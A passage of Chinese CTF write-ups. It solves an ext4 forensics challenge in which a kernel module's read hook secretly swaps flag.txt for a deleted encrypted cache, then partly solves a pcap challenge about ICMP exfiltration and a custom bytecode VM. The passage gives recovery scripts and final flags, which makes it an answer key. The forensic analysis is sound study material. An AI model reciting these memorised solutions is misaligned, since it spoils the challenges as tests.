    # 3. 构造载波与掩码，完成残差解调
    G = np.random.default_rng(555).standard_normal((3, 32, 32))
    mask = np.random.default_rng(20261012).choice([-1.0, 1.0], size=(3, 32, 32))
    unmasked = (x_T - G) * mask

    # 4. 2x2 空间块聚合并重构 25x25 QR 矩阵
    # 空间块重排: (3, 32, 32) -> (3, 16, 2, 16, 2) -> (768, 4)
    blocks = unmasked.reshape(3, 16, 2, 16, 2).transpose(0, 1, 3, 2, 4).reshape(768, 4)[:625]
    module_values = blocks.mean(axis=1).reshape(25, 25)

    # 符号判决: 负值为深色模块(Dark/0), 正值为浅色模块(Light/255)
    dark_modules = module_values < 0

    # 5. 生成标准二维码并扫码
    border = 4
    qr_img_arr = np.pad(np.where(dark_modules, 0, 255).astype(np.uint8), border, constant_values=255)
    qr_img = Image.fromarray(qr_img_arr).resize(((25 + 2 * border) * 10, (25 + 2 * border) * 10), Image.NEAREST)
    qr_path = "recovered_qr.png"
    qr_img.save(qr_path)
    print(f"[*] Reconstructed QR saved to {qr_path}")

    barcodes = zxingcpp.read_barcodes(qr_img)
    for b in barcodes:
        print(f"[+] Decoded Secret ({b.format}): {b.text}")

if __name__ == "__main__":
    main()
```

## FilmReader-镜像取证

```
题目描述：镜像取证
附件：shadowread.zip
```

> 核心思路： `flag.txt` 是安慰奖。无参加载的模块把 `read` 拐到已删除的 `.real_cache` ，目录项空隙里 inode 和 extent 都还在，按模块自己的密钥派生和字节码虚拟机解密就是正稿。

## 1\. 题目说明

题目给的是一块 512MiB 的 ext4 镜像 `shadowread.img` （536870912 字节），卷标 `shadowread` ，块大小 4096。要恢复的是用户真正读到的 flag，不是磁盘上 `flag.txt` 直接变换出来的那一串。

镜像里和本题有关的明文材料有三份。

`/home/ctf/note.txt` ：

```
你看到的是影子。

cat 没有骗你,骗你的是 read。真的东西我搬走了,
磁盘上这份 flag.txt 是留给你们的安慰奖——
它确实能解出一面 flag,但那面是假的,别浪费提交次数。

原来的文件?删了,早就删了。
不过这块盘子记性不太好,删掉的东西,它自己还会念叨一阵子。

钥匙也删了——碎成四瓣,跟那几瓣缓存躺在一起。
哪瓣是真的?我的垫片记得,可惜它也跟着失忆了。

对了,那文件我一共写过两版——草稿和正稿我分得很清,希望你也是。

—— ph4nt0m
```

`/var/log/auth.log` 里这次会话实际执行的命令是：

```swift
2026-10-11T03:13:02+08:00 portal-srv sudo:      ctf : TTY=pts/0 ; PWD=/home/ctf ; USER=root ; COMMAND=/usr/bin/insmod /usr/local/bin/kcompat.ko
2026-10-11T03:13:44+08:00 portal-srv sudo:      ctf : TTY=pts/0 ; PWD=/home/ctf ; USER=root ; COMMAND=/bin/cat /home/ctf/flag.txt
2026-10-11T03:14:02+08:00 portal-srv sudo:      ctf : TTY=pts/0 ; PWD=/home/ctf ; USER=root ; COMMAND=/bin/rm /var/.cache/.kmod/.real_cache.bak
2026-10-11T03:14:20+08:00 portal-srv sudo:      ctf : TTY=pts/0 ; PWD=/home/ctf ; USER=root ; COMMAND=/bin/rm /var/.cache/.kmod/.real_cache
2026-10-11T03:14:35+08:00 portal-srv sudo:      ctf : TTY=pts/0 ; PWD=/home/ctf ; USER=root ; COMMAND=/bin/rm -f /var/.cache/.kmod/.s* /var/.cache/.kmod/.k*
```

`insmod` 没有模块参数。模块本体还在 `/usr/local/bin/kcompat.ko` 。 `/home/ctf/flag.txt` 仍是 40 字节，但 `/var/.cache/.kmod/` 下的缓存和四瓣钥匙已经从目录里删掉。

## 2\. 解题思路

note 把三件事说死了： `cat` 看到的内容被 `read` 掉了包，磁盘上的 `flag.txt` 能解出一面假 flag，真文件和四瓣钥匙都删了，而且真文件有草稿、正稿两版。

`kcompat.ko` 的 init 在拨码大于 2 时读取 `.s1` 、`.s2` 、`.s3` 的前 4 字节，用 `.s2[0] & 3` 决定 `.k0` 到 `.k3` 里的哪一瓣，拼成 16 字节后做 SHA-256，再把摘要迭代 `0x1ffffff` 次。摘要后 16 字节必须等于 `.rodata` 里的一份校验值。前 16 字节是虚拟机密钥，它的低 32 位再用来解开同一节里的 448 字节字节码。

read hook 只认文件名 `flag.txt` 。密钥派生成功后，它不再读 `/home/ctf/flag.txt` ，而是打开 `/var/.cache/.kmod/.real_cache` ，按 8 字节交给 `.text+0x10` 的栈虚拟机。未武装时的回退才是对 `flag.txt` 本身做减、循环右移、异或，那一串就是 note 里的安慰奖。

这些缓存文件的目录项已经被合并进前一项的 `rec_len` ，名字还留在空隙里，extent 也没有回收。日志超级块显示 journal 从 block 0 开始，没有另一份待回放的旧数据。直接按现存 inode 读出 `.real_cache` 再跑模块里的解密，得到的才是正稿。`.real_cache.bak` 用同一把密钥解出草稿。

## 3\. 解题过程

### 3.1 从目录项空隙读出被删缓存

ext4 删除目录项时通常不立刻清掉名字，而是把这项的空间并进前一个存活项的 `rec_len` 。inode 号和文件名仍按 4 字节对齐留在这块空隙里。这些 inode 的 `i_block` 仍是一棵深度为 0 的 extent 树，魔数 `0xF30A` ，逻辑块还指向原来的数据块。

对 journal 数据块做 `debugfs logdump` ，得到的都是：

```
Journal starts at block 0, transaction 7
```

journal 没有停在半截事务上，删掉的内容不需要从日志里重放。从根 inode 2 走目录，把空隙中的名字也当成子项，就能读回 `/var/.cache/.kmod/` 下的全部缓存：

| 路径  | 长度  |
| --- | --- |
| `/var/.cache/.kmod/.real_cache` | 32  |
| `/var/.cache/.kmod/.real_cache.bak` | 32  |
| `/var/.cache/.kmod/.s1`<br><br>、`.s2` 、`.s3` | 各 64 |
| `/var/.cache/.kmod/.k0`<br><br>到 `.k3` | 各 64 |
| `/home/ctf/flag.txt` | 40  |

同目录里还有 `.s1.bak` 、`.s1.old` 、`.s2.bak` 、`.s3.bak` 。模块解码出来的路径没有这些后缀，它们不参与密钥派生。

### 3.2 确认默认拨码会改读.real_cache

`objdump` 把模块里的重定位显示成 `rip+0x0` ，不能单靠那条指令看出比较的是哪个符号。`.data+0x9b8` 处的有符号整数是 4，而 `insmod` 没有传参，加载后用的就是这个默认值。init 在该值大于 2 时才进入读缓存、做 SHA-256、核对摘要的路径。后面摘要核对成功，说明镜像上实际走的就是这条路径。

`.rodata+0x130` 起是一组用 `0xc3` 逐字节异或的 C 字符串，解码后是：

```swift
/var/.cache/.kmod/.k
/var/.cache/.kmod/.s3
/var/.cache/.kmod/.s2
/var/.cache/.kmod/.s1
/var/.cache/.kmod/.real_cache
/home/ctf/flag.txt
```

init 加载时把这些路径解回明文。read hook 在 `.text+0xe10` 。它先要求读取长度落在 `1 .. 0x400000` ，拨码大于 1，目标是普通文件，目录项名字正好是小端常数 `0x7478742e67616c66` （ `flag.txt` ），名字长度 8。拨码不大于 2 时，钩子把文件还回去，调用原来的 read。

拨码大于 2 以后还要看 init 有没有把武装标志置 1。这个标志只在摘要校验通过、448 字节字节码就地解密完成之后才写成 1。置位后的分支不再读用户打开的 `flag.txt` ，而是 `filp_open` 上面那条 `.real_cache` ，把读到的内容按 8 字节送进虚拟机。因此 `cat /home/ctf/flag.txt` 显示的是 `.real_cache` 的明文，不是磁盘上那 40 字节。

### 3.3 用.s2\[0\] 的低两位选出.k2

拨码大于 2 时，init 对三条 `.s*` 路径各读 4 字节，放进栈上的 16 字节缓冲区：

```
rsp+0x10  第一份 4 字节
rsp+0x14  第二份 4 字节
rsp+0x18  第三份 4 字节
```

接着取 `rsp+0x14` 的第一个字节， `and 3` ，加上 `0x30` ，接到 `.k` 路径末尾，再读这个路径的前 4 字节放到 `rsp+0x1c` 。`.s2` 的首字节是 `0xb6` ， `0xb6 & 3 = 2` ，所以第四份是 `.k2` 的前 4 字节。`.k0` 、`.k1` 、`.k3` 不进入材料。

16 字节材料是：

```
3f9a2c71 b6567e02 d8c10f99 27e6a450
```

依次对应 `.s1` 、`.s2` 、`.s3` 、`.k2` 的前 4 字节。init 先对这 16 字节做一次 SHA-256，再对得到的 32 字节摘要重复哈希 `0x1ffffff` 次（ `r12d` 初值 `0x1ffffff` ，每次 `dec` 后继续）。摘要为：

```
a65dc30a337a3faee5a58c868fc3e715e3b9cbcd45c9fcec9fd1f00a1f4a2371
```

校验使用后 16 字节 `e3b9cbcd45c9fcec9fd1f00a1f4a2371` 。`.rodata+0x3c0` 的 16 字节逐字节异或 `0xa6` 之后与它相同，init 才会把前 16 字节 `a65dc30a337a3faee5a58c868fc3e715` 留作虚拟机密钥，并继续解密字节码。

### 3.4 按 mov ebx, eax 的零扩展解开字节码

字节码是 `.rodata+0x200` 起的 `0x1c0` 字节。密钥流是 64 位 LCG，乘数 `0x5851f42d4c957f2d` ，加数 `0x14057b7ef767814f` 。初态不能先把高 32 位或成 `0x5a5a5a5a` 再对整个 64 位异或：init 的指令是

```
mov    ebx, eax
movabs rax, 0x5a5a5a5a5a5a5a5a
xor    rbx, rax
```

`mov ebx, eax` 会把高 32 位清零。 `eax` 是摘要的低 32 位 `0xa65dc30a` ，异或之后的初态是

```
((0xa65dc30a ^ 0x5a5a5a5a) | (0x5a5a5a5a << 32))
```

高 32 位保持 `0x5a5a5a5a` 。若先或再异或，高半部会被清掉，虚拟机收到的就不是这 448 字节明文，缓存也不会被改写。

每个输出字节都先做一次

```
state = state * 0x5851f42d4c957f2d + 0x14057b7ef767814f
```

再取 `state >> 56` 与密文字节异或。循环上界是 `0x1c0` ，和这段字节码的长度一致。

### 3.5 用栈虚拟机解密正稿

虚拟机在 `.text+0x10` 。read hook 为每个 8 字节块准备 64 字节缓冲区：前 16 字节是摘要密钥，偏移 16 处放当前密文。调用约定就是 `rdi` 指向这块缓冲区。返回值是 0 时，钩子把偏移 16 的 8 字节写回用户缓冲区；剩余长度不足 8 的尾巴不进入虚拟机。

解释器的状态是：

-   累加器初值 `0xffffffa5` 。操作码等于 `code[pc] ^ (acc & 0xff)` ，每执行一条指令后 `acc = (acc * 0x6d + 0x3b) & 0xffffffff` 。
    
-   64 个 32 位栈槽。 `0x01` 压入立即数 dword， `0x02` 压入立即数字节， `0x07` / `0x08` 从缓冲区按字节或小端 dword 读取， `0x09` / `0x0a` 按字节或 dword 写回。地址都 `& 0x3f` ，所以读写不出这 64 字节。
    
-   `0x0b` 到 `0x13` 是加、减、异或、与、或、左移、逻辑右移、循环右移和乘法，运算宽度 32 位。
    
-   `0x1a` 返回 0。步数超过 `0x30d40` 或程序计数器超过 `0x1bf` 则失败，钩子保留原密文。
    

同一段字节码、同一把 16 字节密钥解两份 32 字节缓存：

| 文件  | 明文  | 含义  |
| --- | --- | --- |
| `.real_cache` | `flag{n0_m0d3l_r34d5_7h15_d33p}` | 钩子实际打开的正稿 |
| `.real_cache.bak` | `flag{f1r57_c4ch3_15_4_dr4ft}` | 先被删掉的草稿 |

正稿 30 字节，后面两个 NUL；草稿 28 字节，后面四个 NUL。两者都落在各自文件的 32 字节里。

### 3.6 把磁盘上的 flag.txt 解成安慰奖，但不提交

武装标志为 0 时，钩子仍会读原始文件，读到正数个字节后走 `.text+0x11ea` 。那里 `ebx` 从 3 开始，对每个下标 `i` ：

```
b = ror8((b - table[ebx % 20]) & 0xff, i)
b ^= table[i % 20]
ebx += 7
```

`table` 是 `.rodata+0x100` 的 20 字节 `sh4d0w_1n_7h3_k3rn3l` 。字节旋转只使用计数的低 3 位。默认拨码是 4 且摘要校验已经通过，这次 `cat` 不会走这条回退。把磁盘上的 40 字节 `flag.txt` 送进同一变换，得到

```
flag{r34d_h00k_d3crypt5_3v3ryth1ng}
```

这就是 note 说的安慰奖。它格式完整，但不是 read hook 交还给 `cat` 的那一串。

## 4\. 完整解题脚本

依赖 Python 标准库。脚本自己解析 ext4 和 ELF，从镜像读出被删缓存与 `kcompat.ko` ，完成密钥派生、字节码解密和虚拟机解密。 `0x1ffffff` 次 SHA-256 是主要耗时。

```rust
#!/usr/bin/env python3
"""Recover the real flag from the shadowread ext4 image.

The module's default dial is high enough to ignore flag.txt and decrypt
/var/.cache/.kmod/.real_cache. Deleted cache inodes are still allocated, so
their bytes can be read without replaying the journal.
"""

import argparse
import hashlib
import pathlib
import struct

DEFAULT_IMAGE = pathlib.Path(r"C:\Users\34645\Downloads\shadowread\shadowread.img")

class Ext4:
    def __init__(self, blob: bytes) -> None:
        self.blob = blob
        superblock = blob[1024:2048]
        self.block_size = 1024 << struct.unpack_from("<I", superblock, 0x18)[0]
        self.inodes_per_group = struct.unpack_from("<I", superblock, 0x28)[0]
        self.inode_size = struct.unpack_from("<H", superblock, 0x58)[0]
        incompat = struct.unpack_from("<I", superblock, 0x60)[0]
        self.desc_size = struct.unpack_from("<H", superblock, 0xFE)[0] if incompat & 0x80else32
        self.volume = superblock[0x78:0x88].split(b"\x00", 1)[0].decode()

    def inode_raw(self, number: int) -> tuple[bytes, int]:
        group = (number - 1) // self.inodes_per_group
        index = (number - 1) % self.inodes_per_group
        desc_off = self.block_size + group * self.desc_size
        desc = self.blob[desc_off:desc_off + self.desc_size]
        table = struct.unpack_from("<I", desc, 8)[0]
        if self.desc_size >= 64:
            table |= struct.unpack_from("<I", desc, 40)[0] << 32
        off = table * self.block_size + index * self.inode_size
        raw = self.blob[off:off + self.inode_size]
        size = struct.unpack_from("<I", raw, 4)[0]
        if self.inode_size >= 0x70:
            size |= struct.unpack_from("<I", raw, 0x6C)[0] << 32
        return raw, size

    def read_inode(self, number: int) -> bytes:
        raw, size = self.inode_raw(number)
        magic, entries, _, depth, _ = struct.unpack_from("<HHHHI", raw, 0x28)
        if magic != 0xF30Aor depth != 0:
            raise RuntimeError(f"inode {number}: unexpected extent header {magic:#x} depth {depth}")
        out = bytearray()
        for entry in range(entries):
            logical, length, start_hi, start_lo = struct.unpack_from("<IHHI", raw, 0x34 + entry * 12)
            del logical
            start = start_lo | (start_hi << 32)
            for block in range(length & 0x7FFF):
                at = (start + block) * self.block_size
                out += self.blob[at:at + self.block_size]
                if len(out) >= size:
                    return bytes(out[:size])
        return bytes(out[:size])

def directory_entries(data: bytes) -> list[tuple[int, str, bool]]:
    """Return (inode, name, deleted). Deleted names survive inside an enlarged rec_len."""
    found = []
    position = 0
    while position + 8 <= len(data):
        inode, rec_len, name_len, _ = struct.unpack_from("<IHBB", data, position)
        if rec_len < 8or position + rec_len > len(data):
            break
        if inode and name_len:
            found.append((inode, data[position + 8:position + 8 + name_len].decode("latin1"), False))
        slack = position + ((8 + name_len + 3) & ~3)
        end = position + rec_len
        while slack + 8 <= end:
            hidden_inode, _, hidden_len, _ = struct.unpack_from("<IHBB", data, slack)
            if hidden_len == 0or slack + 8 + hidden_len > end ornot hidden_inode:
                break
            found.append((hidden_inode, data[slack + 8:slack + 8 + hidden_len].decode("latin1"), True))
            slack += (8 + hidden_len + 3) & ~3
        position += rec_len
    return found

def walk(fs: Ext4) -> dict[str, bytes]:
    files: dict[str, bytes] = {}

    def visit(inode: int, path: str) -> None:
        raw, size = fs.inode_raw(inode)
        mode = struct.unpack_from("<H", raw, 0)[0]
        body = fs.read_inode(inode)
        if mode & 0x4000:
            for child, name, _deleted in directory_entries(body):
                if name in (".", ".."):
                    continue
                visit(child, f"{path}/{name}")
            return
        if mode & 0x8000:
            files[path] = body
            del size

    visit(2, "")
    return files

def elf_section(blob: bytes, wanted: str) -> bytes:
    shoff = struct.unpack_from("<Q", blob, 40)[0]
    shentsize = struct.unpack_from("<H", blob, 58)[0]
    shnum = struct.unpack_from("<H", blob, 60)[0]
    shstrndx = struct.unpack_from("<H", blob, 62)[0]

    def header(index: int) -> tuple:
        return struct.unpack_from("<IIQQQQIIQQ", blob, shoff + index * shentsize)

    names = blob[header(shstrndx)[4]:header(shstrndx)[4] + header(shstrndx)[5]]
    for index in range(shnum):
        name_off, _, _, _, offset, size, *_ = header(index)
        name = names[name_off:names.index(b"\x00", name_off)].decode()
        if name == wanted:
            return blob[offset:offset + size]
    raise KeyError(wanted)

def ror8(value: int, count: int) -> int:
    count &= 7
    value &= 0xFF
    if count == 0:
        return value
    return ((value >> count) | (value << (8 - count))) & 0xFF

def consolation(data: bytes, table: bytes) -> bytes:
    """dial == 0: sub, rotate right, xor. This is the planted fake flag."""
    state = 3
    out = bytearray(data)
    for index, value in enumerate(out):
        value = (value - table[state % 20]) & 0xFF
        value = ror8(value, index)
        value ^= table[index % 20]
        out[index] = value
        state += 7
    return bytes(out)

def derive_key(material: bytes) -> bytes:
    digest = hashlib.sha256(material).digest()
    for _ in range(0x1FFFFFF):
        digest = hashlib.sha256(digest).digest()
    return digest

def decrypt_bytecode(blob: bytes, key_lo: int) -> bytes:
    # mov ebx, eax zeros the high half, then xor rbx, 0x5a5a5a5a5a5a5a5a.
    state = ((key_lo & 0xFFFFFFFF) ^ 0x5A5A5A5A) | (0x5A5A5A5A << 32)
    multiplier = 0x5851F42D4C957F2D
    increment = 0x14057B7EF767814F
    mask = (1 << 64) - 1
    out = bytearray(blob)
    for index in range(len(out)):
        state = (state * multiplier + increment) & mask
        out[index] ^= (state >> 56) & 0xFF
    return bytes(out)

def run_vm(code: bytes, memory: bytearray) -> int:
    acc = 0xFFFFFFA5
    pc = 0
    sp = 0
    flag = 0
    stack = [0] * 64
    steps = 0
    whileTrue:
        steps += 1
        if steps > 0x30D40or pc > 0x1BF:
            return-1
        op = code[pc] ^ (acc & 0xFF)
        if op == 0x1:
            stack[sp] = struct.unpack_from("<I", code, pc + 1)[0]
            sp += 1
            pc += 5
        elif op == 0x2:
            stack[sp] = code[pc + 1]
            sp += 1
            pc += 2
        elif op == 0x3:
            sp -= 1
            pc += 1
        elif op == 0x4:
            stack[sp] = stack[sp - 1]
            sp += 1
            pc += 1
        elif op == 0x5:
            stack[sp - 1], stack[sp - 2] = stack[sp - 2], stack[sp - 1]
            pc += 1
        elif op == 0x6:
            stack[sp] = stack[sp - 2]
            sp += 1
            pc += 1
        elif op == 0x7:
            stack[sp - 1] = memory[stack[sp - 1] & 0x3F]
            pc += 1
        elif op == 0x8:
            stack[sp - 1] = struct.unpack_from("<I", memory, stack[sp - 1] & 0x3F)[0]
            pc += 1
        elif op == 0x9:
            memory[stack[sp - 2] & 0x3F] = stack[sp - 1] & 0xFF
            sp -= 2
            pc += 1
        elif op == 0xA:
            struct.pack_into("<I", memory, stack[sp - 2] & 0x3F, stack[sp - 1] & 0xFFFFFFFF)
            sp -= 2
            pc += 1
        elif0xB <= op <= 0x13:
            left = stack[sp - 2] & 0xFFFFFFFF
            right = stack[sp - 1] & 0xFFFFFFFF
            count = right & 31
            if op == 0xB:
                result = (left + right) & 0xFFFFFFFF
            elif op == 0xC:
                result = (left - right) & 0xFFFFFFFF
            elif op == 0xD:
                result = left ^ right
            elif op == 0xE:
                result = left & right
            elif op == 0xF:
                result = left | right
            elif op == 0x10:
                result = (left << count) & 0xFFFFFFFF
            elif op == 0x11:
                result = left >> count
            elif op == 0x12:
                result = ((left >> count) | (left << ((32 - count) & 31))) & 0xFFFFFFFFif count else left
            else:
                result = (left * right) & 0xFFFFFFFF
            sp -= 1
            stack[sp - 1] = result
            pc += 1
        elif op in (0x15, 0x16, 0x17, 0x18):
            target = pc + 2 + struct.unpack_from("b", code, pc + 1)[0]
            if op == 0x15:
                pc = target
            elif op == 0x16:
                sp -= 1
                pc = target if stack[sp] == 0else pc + 2
            elif op == 0x17:
                sp -= 1
                pc = target if stack[sp] != 0else pc + 2
            else:
                flag = (flag - 1) & 0xFF
                pc = target if flag != 0else pc + 2
        elif op == 0x19:
            flag = code[pc + 1]
            pc += 2
        elif op == 0x1A:
            return0
        elif op == 0x1B:
            stack[sp] = flag
            sp += 1
            pc += 1
        else:
            return-1
        acc = (acc * 0x6D + 0x3B) & 0xFFFFFFFF

def vm_decrypt(code: bytes, key: bytes, blob: bytes) -> bytes:
    out = bytearray(blob)
    for offset in range(0, len(out) - 7, 8):
        memory = bytearray(64)
        memory[:16] = key
        memory[16:24] = out[offset:offset + 8]
        if run_vm(code, memory) == 0:
            out[offset:offset + 8] = memory[16:24]
    return bytes(out)

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--image", type=pathlib.Path, default=DEFAULT_IMAGE)
    args = parser.parse_args()
    fs = Ext4(args.image.read_bytes())
    files = walk(fs)
    print(f"volume {fs.volume} block {fs.block_size}")
    cache = {path: body for path, body in files.items() if"/.kmod/"in path or path.endswith("flag.txt")}
    for path in sorted(cache):
        print(f"file {path} {len(cache[path])}")

    rodata = elf_section(files["/usr/local/bin/kcompat.ko"], ".rodata")
    data = elf_section(files["/usr/local/bin/kcompat.ko"], ".data")
    dial = struct.unpack_from("<i", data, 0x9B8)[0]
    table = rodata[0x100:0x115]
    paths = []
    cursor = 0x130
    while cursor < 0x1F0:
        end = rodata.index(b"\x00", cursor)
        paths.append(bytes(byte ^ 0xC3for byte in rodata[cursor:end]))
        cursor = end + 1
        while cursor < 0x1F0and rodata[cursor] == 0:
            cursor += 1
    print("dial", dial)
    print("paths", [item.decode() for item in paths])

    s1 = files["/var/.cache/.kmod/.s1"]
    s2 = files["/var/.cache/.kmod/.s2"]
    s3 = files["/var/.cache/.kmod/.s3"]
    shard = s2[0] & 3
    key_file = files[f"/var/.cache/.kmod/.k{shard}"]
    material = s1[:4] + s2[:4] + s3[:4] + key_file[:4]
    digest = derive_key(material)
    expect = bytes(byte ^ 0xA6for byte in rodata[0x3C0:0x3D0])
    print(f"selector s2[0]&3 = {shard}")
    print("material", material.hex())
    print("digest", digest.hex())
    print("check", digest[16:].hex(), "match", digest[16:] == expect)

    code = decrypt_bytecode(rodata[0x200:0x3C0], struct.unpack_from("<I", digest, 0)[0])
    key = digest[:16]
    real = vm_decrypt(code, key, files["/var/.cache/.kmod/.real_cache"])
    draft = vm_decrypt(code, key, files["/var/.cache/.kmod/.real_cache.bak"])
    fake = consolation(files["/home/ctf/flag.txt"], table)
    print("real", real)
    print("draft", draft)
    print("consolation", fake)

if __name__ == "__main__":
    main()
```

函数 `consolation` 的注释把这条回退写成 `dial == 0` 。反汇编里它是武装标志未置位时的变换；默认拨码为 4 且校验通过时不会执行。脚本仍计算它，只为把安慰奖和正稿分开。

## 失陷主机流量分析 (capture.pcap)

```
题目描述：
我们从一台失陷主机上抓到了一段流量：capture.pcap。抓包抓到一半主机断电了。
附件：capture.zip
```

> **核心思路**：通过以太网帧与 IPv4 头部长度字段修复损坏的 PCAP 文件头及包记录头，从 HTTP、DNS、ICMP 流量中搜集 12 条文档碎片，结合测试服务交互流量逆向还原 MSB 比特流打包的 KV-VM 虚拟机指令集（ `rev.B` 与 `rev.C` ），依次解密并执行 `KV` 与 `PX` 两个 ICMP 隐蔽通道中的自修改字节码，拼接得到完整 Flag。

## 1\. 题目说明

题目给出如下背景描述与流量文件 `capture.pcap` （大小 `5,954,555` 字节，SHA-256 为 `ef38842f4026e501f6a712cbeaa9ea19c5d6ab376108f71e03eed90a0feff8f4` ）：

```
我们从一台失陷主机上抓到了一段流量：capture.pcap。抓包抓到一半主机断电了。
```

目标是修复并分析 `capture.pcap` 中失陷主机（ `10.0.0.5` ）的外传流量，还原攻击者传出的真实数据并获取 `flag{...}` 格式的 Flag。

## 2\. 解题思路

1.  **修复损坏的 PCAP 结构**：检查文件头发现 Magic Number 被篡改为 `0xa9b2c3d4` 、LinkType 被篡改为 `0x1337` ，且第 47、53、59、67、75、83 号数据包的 `incl_len` / `orig_len` 字段被篡改导致后续数据包错位。利用二层以太网帧类型（IPv4 头部 `Total Length + 14` 、ARP 固定 `42` 字节）重新计算每个数据包的真实长度，即可无损恢复全部 4561 个数据包。
    
2.  **提取并还原 12 条文档碎片**：遍历修复后的 HTTP、DNS TXT（含单字节异或混淆）和 ICMP Echo Reply 流量，找齐编号为 `1/12` 至 `12/12` 的提示信息与 `/kv-vm-manual.txt` 文档，明确 ICMP 隧道的包结构、密钥链算法以及 KV-VM v3 虚拟机的比特流指令格式。
    
3.  **根据测试机流量逆向 5-bit 指令集**：流量中包含失陷主机对 `10.0.0.99:31337` （ `rev.B` ）和 `10.0.0.99:31338` （ `rev.C` ）发送的 `RUN <hex>` 测试指令及返回结果。对比测试输入与输出，还原全部 19 条 5-bit 操作码，并定位 `rev.C` 相较 `rev.B` 重定义的 3 条指令行为（ `RORI` 、 `POP` 空栈返回 0、 `JMPR` 乘 16）。
    
4.  **两阶段字节码解密与虚拟机执行**：
    

-   第一阶段：用初始密钥 解密并校验 `KV` 通道分片，重组出 251 字节的 `rev.B` 字节码，送入虚拟机运行得到前半段 Flag `flag{tw0_c4t` 以及第二阶段参数 `PX rev.C k=9f3cb712aa55d04e` 。
    
-   第二阶段：提取 ICMP 中 `PX` 通道的 5 个分片（42 字节），用密钥 `9f3cb712aa55d04e` 循环异或解密后送入 `rev.C` 虚拟机运行，得到后半段 Flag `s_0ne_tr4p}` 。
    

## 3\. 解题过程

### 3.1 修复 PCAP 全局文件头与包长度字段

**关键观察：** 直接用 Wireshark 打开 `capture.pcap` 会报错。读取文件前 24 字节全局头并按小端序解析包头时，解析到第 48 号包（偏移 `7082` ）出现长度异常（ `incl_len = 3997706` ）：

```
Header (24 bytes): d4c3b2a9 0200 0400 00000000 00000000 ffff0000 37130000
Pkt 47: offset=7001, incl_len=65, orig_len=65
Pkt 48: offset=7082, incl_len=3997706, orig_len=3997696, first16=00000200000000050200000000990800
```

可以看到：

1.  全局头前 4 字节为 `d4 c3 b2 a9` （ `0xa9b2c3d4` ），标准微秒级 PCAP Magic 应为 `d4 c3 b2 a1` （ `0xa1b2c3d4` ）；末尾 4 字节 LinkType 为 `37 13 00 00` （ `0x1337` ），标准 Ethernet 应为 `01 00 00 00` （ `1` ）。
    
2.  在第 48 号包的 `first16` 中，以太网帧头 `020000000005 020000000099 0800` 向后偏移了 2 字节。查看第 47 号包（偏移 `7017` ）的 IPv4 头部，其 `Total Length` 字段为 `0x0035` （53 字节），加上 14 字节以太网帧头，实际帧长应为 字节，而第 47 号包头中的 `incl_len` 却写成了 `65` 。
    

**原理与操作：** PCAP 文件中的每个数据包均为标准以太网帧（ `0x0800` IPv4 或 `0x0806` ARP）。对于 IPv4 数据包，真实帧长恒等于 ；对于 ARP 数据包，真实帧长恒为 42 字节。据此扫描全文件并对比 `incl_len` 与真实帧长：

```python
import struct

with open("capture.pcap", "rb") as f:
    data = bytearray(f.read())

data[0:4] = struct.pack("<I", 0xA1B2C3D4)
data[20:24] = struct.pack("<I", 1)

offset = 24
pkt_idx = 0
while offset + 16 <= len(data):
    ts_sec, ts_usec, incl_len, orig_len = struct.unpack("<IIII", data[offset:offset+16])
    pkt_start = offset + 16
    eth_type = struct.unpack(">H", data[pkt_start+12:pkt_start+14])[0]
    real_len = 14 + struct.unpack(">H", data[pkt_start+16:pkt_start+18])[0] if eth_type == 0x0800else42
    if incl_len != real_len:
        print(f"Mismatch at Pkt {pkt_idx} (offset {offset}): header={incl_len}, real={real_len}")
        data[offset+8:offset+16] = struct.pack("<II", real_len, real_len)
    offset = pkt_start + real_len
    pkt_idx += 1
print(f"Total packets: {pkt_idx}, final offset: {offset}/{len(data)}")
```

**本步结果：** 共定位并修复 6 处包长篡改，最终偏移恰好等于文件总大小 `5954555` 字节，完整恢复 4561 个数据包：

```sql
Mismatch at Pkt 47 (offset 7001): header=65, real=67
Mismatch at Pkt 53 (offset 7491): header=64, real=71
Mismatch at Pkt 59 (offset 7983): header=64, real=71
Mismatch at Pkt 67 (offset 8639): header=71, real=75
Mismatch at Pkt 75 (offset 9337): header=86, real=83
Mismatch at Pkt 83 (offset 10035): header=76, real=83
Total packets: 4561, final offset: 5954555/5954555
```

### 3.2 提取 12 条分析笔记与虚拟机参考手册

**关键观察：** 对修复后的流量按协议分类后（排除末尾用于填充体积的 UDP `8.8.8.8:443` 与 TCP `1.1.1.1:443` 流量），在 HTTP（ `10.0.0.80:80` ）、DNS（ `10.0.0.53:53` ）和 ICMP（ `10.0.0.99` ）中发现编号为 `X/12` 的分片提示（其中 Pkt 39 的 DNS 响应经过了 `0x42` 单字节异或混淆）。

**原理与操作：** 遍历全部数据包，提取包含 `/12` 的明文及单字节异或 payload，同时导出 HTTP 响应中的 `/kv-vm-manual.txt` 。

**本步结果：** 按序号 `1/12` 至 `12/12` 整理出的完整提示如下：

| 编号  | 来源位置 | 内容  |
| --- | --- | --- |
| `1/12` | Pkt 33 (`doc1.darknet-corp.net` TXT) | `field notes 1/12 :: he exfils over ICMP echo. exactly ONE channel is his. the rest are chaff. mostly.` |
| `2/12` | Pkt 35 (`doc2.darknet-corp.net` TXT) | `2/12 :: payload: 'KV' u8 seq \| u8 len \| u8 cksum \| data. reassemble by seq asc.` |
| `3/12` | Pkt 10 (`/cat1.jpg` HTTP 响应头) | `3/12 :: data[i]=plain[i]^((K_seq+i)&0xFF). cksum=sum(plain)&0xFF. drop bad cksum; first valid per seq wins.` |
| `4/12` | Pkt 37 (`doc4.darknet-corp.net` TXT) | `4/12 :: key chain rev.B: K_0=0xA6, K_(n+1)=(K_n*31+7)&0xFF` |
| `5/12` | Pkt 12 (`/cat2.jpg` JPEG COM 注释段) | `5/12 :: note: rev.B keychain doc had a typo. K_0=0xA5. burn rev.B.` |
| `6/12` | Pkt 210 (ICMP Echo Reply) | `6/12 :: the reassembled bytes are firmware v3 bytecode.` |
| `7/12` | Pkt 39 (`doc7.darknet-corp.net` TXT ^ `0x42`) | `7/12 :: v3 packs instructions MSB-first, no byte alignment: opcode 5b, reg 4b, imm 8b, addr 16b (bit addr).` |
| `8/12` | Pkt 12 (`/cat2.jpg` HTTP 响应头) | `8/12 :: data space is byte-addressed. pc is a bit address. jumps take bit addrs; JMPR jumps R*8.` |
| `9/12` | Pkt 16 (`/favicon.ico` HTTP 404 正文) | `9/12 :: there is no opcode list. the box at 10.0.0.99:31337 answers test programs. query: RUN <hex>` |
